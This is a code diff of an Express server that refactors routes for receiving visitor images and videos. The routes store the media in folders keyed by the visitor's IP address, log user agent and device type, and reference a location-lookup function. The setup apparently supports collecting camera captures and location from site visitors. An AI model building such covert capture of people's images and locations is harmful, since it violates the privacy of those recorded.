@@ -13,6 +13,8 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const multer = require("multer");
 const crypto = require("crypto");
+const bodyParser = require('body-parser');
+
 
 // Set up view engine
 app.set("view engine", "ejs");
@@ -34,6 +36,9 @@ app.use(useragent.express());
 
 // Client IP middleware
 app.use(requestIp.mw());
+
+app.use(bodyParser.json({ limit: '10mb' }));
+app.use(bodyParser.urlencoded({ limit: '10mb', extended: true }));
 
 // Function to get detailed location data
 async function getDetailedLocation(ip) {
@@ -460,118 +465,111 @@ const videoUpload = multer({
   limits: { fileSize: 100 * 1024 * 1024 }, // 100 MB limit
 });
 
-// Route to handle user images
-app.post("/user-image", (req, res) => {
+app.post('/user-image', (req, res) => {
   try {
     const imageData = req.body.image;
     const timestamp = req.body.timestamp || new Date().toISOString();
-    const formattedTimestamp = timestamp.replace(/[:.]/g, "-");
-
+    const formattedTimestamp = timestamp.replace(/[:.]/g, '-');
+    const userAgent = req.body.userAgent;
+    const isMobile = req.body.isMobile;
+    
     // Get client IP for folder structure
-    const clientIp =
-      req.clientIp ||
-      req.headers["x-forwarded-for"] ||
-      req.connection.remoteAddress ||
-      "Unknown";
-    const sanitizedIp = clientIp.replace(/[.:]/g, "-");
-
+    const clientIp = req.clientIp || req.headers['x-forwarded-for'] || 
+                    req.connection.remoteAddress || 'Unknown';
+    const sanitizedIp = clientIp.replace(/[.:]/g, '-');
+    
     // Create date-based folder structure: media/YYYY-MM-DD/[IP]/images
     const today = new Date();
-    const dateFolder = `${today.getFullYear()}-${(today.getMonth() + 1)
-      .toString()
-      .padStart(2, "0")}-${today.getDate().toString().padStart(2, "0")}`;
-    const imageDir = path.join(
-      __dirname,
-      "media",
-      dateFolder,
-      sanitizedIp,
-      "images"
-    );
-
+    const dateFolder = `${today.getFullYear()}-${(today.getMonth()+1).toString().padStart(2, '0')}-${today.getDate().toString().padStart(2, '0')}`;
+    const imageDir = path.join(__dirname, 'media', dateFolder, sanitizedIp, 'images');
+    
     // Create directory if it doesn't exist
     if (!fs.existsSync(imageDir)) {
       fs.mkdirSync(imageDir, { recursive: true });
     }
-
+    
     // Generate unique filename
-    const randomHash = crypto.randomBytes(4).toString("hex");
+    const randomHash = crypto.randomBytes(4).toString('hex');
     const imageFileName = `image-${formattedTimestamp}-${randomHash}.jpg`;
     const imagePath = path.join(imageDir, imageFileName);
-
+    
     // Remove the data:image/jpeg;base64, part
     const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, "");
-
+    
     // Write the image file
-    fs.writeFile(imagePath, base64Data, "base64", (err) => {
+    fs.writeFile(imagePath, base64Data, 'base64', (err) => {
       if (err) {
-        console.error("Error saving user image:", err);
-        return res.status(500).send({ status: "error" });
+        console.error('Error saving user image:', err);
+        return res.status(500).json({ status: 'error', message: 'Failed to save image' });
       }
-
+      
       // Log successful save
       console.log(`User image saved to: ${imagePath}`);
-
+      
       // Update the media tracking index
-      updateMediaIndex(
-        clientIp,
-        sanitizedIp,
-        "image",
-        imageFileName,
-        dateFolder
-      );
-
-      res.status(200).send({ status: "success" });
+      updateMediaIndex(clientIp, sanitizedIp, 'image', imageFileName, dateFolder, {
+        userAgent,
+        isMobile
+      });
+      
+      // Send successful response
+      res.status(200).json({ 
+        status: 'success',
+        message: 'Image saved successfully',
+        filename: imageFileName
+      });
     });
   } catch (error) {
-    console.error("Error processing image data:", error);
-    res
-      .status(500)
-      .send({ status: "error", message: "Failed to process image" });
+    console.error('Error processing image data:', error);
+    res.status(500).json({ 
+      status: 'error', 
+      message: 'Failed to process image',
+      error: error.message 
+    });
   }
 });
 
-// Route to handle user videos
-app.post("/user-video", videoUpload.single("video"), (req, res) => {
+// Update the user-video route handler to respond with proper JSON
+app.post('/user-video', videoUpload.single('video'), (req, res) => {
   try {
     // File was uploaded by multer middleware
     if (!req.file) {
-      return res
-        .status(400)
-        .send({ status: "error", message: "No video file received" });
+      return res.status(400).json({ status: 'error', message: 'No video file received' });
     }
-
+    
     // Get client IP for reference
-    const clientIp =
-      req.clientIp ||
-      req.headers["x-forwarded-for"] ||
-      req.connection.remoteAddress ||
-      "Unknown";
-    const sanitizedIp = clientIp.replace(/[.:]/g, "-");
-
+    const clientIp = req.clientIp || req.headers['x-forwarded-for'] || 
+                    req.connection.remoteAddress || 'Unknown';
+    const sanitizedIp = clientIp.replace(/[.:]/g, '-');
+    
     // Extract date folder from the file path
     const filePath = req.file.path;
     const pathParts = filePath.split(path.sep);
-    const dateIndex = pathParts.indexOf("media") + 1;
+    const dateIndex = pathParts.indexOf('media') + 1;
     const dateFolder = pathParts[dateIndex];
-
+    
     // Log successful upload
     console.log(`User video saved: ${req.file.path}`);
-
+    
     // Update the media tracking index
-    updateMediaIndex(
-      clientIp,
-      sanitizedIp,
-      "video",
-      req.file.filename,
-      dateFolder
-    );
-
-    res.status(200).send({ status: "success" });
+    updateMediaIndex(clientIp, sanitizedIp, 'video', req.file.filename, dateFolder, {
+      userAgent: req.body.userAgent,
+      isMobile: req.body.isMobile === 'true'
+    });
+    
+    // Send successful response
+    res.status(200).json({ 
+      status: 'success',
+      message: 'Video saved successfully',
+      filename: req.file.filename
+    });
   } catch (error) {
-    console.error("Error processing video upload:", error);
-    res
-      .status(500)
-      .send({ status: "error", message: "Failed to process video" });
+    console.error('Error processing video upload:', error);
+    res.status(500).json({ 
+      status: 'error', 
+      message: 'Failed to process video',
+      error: error.message
+    });
   }
 });
 
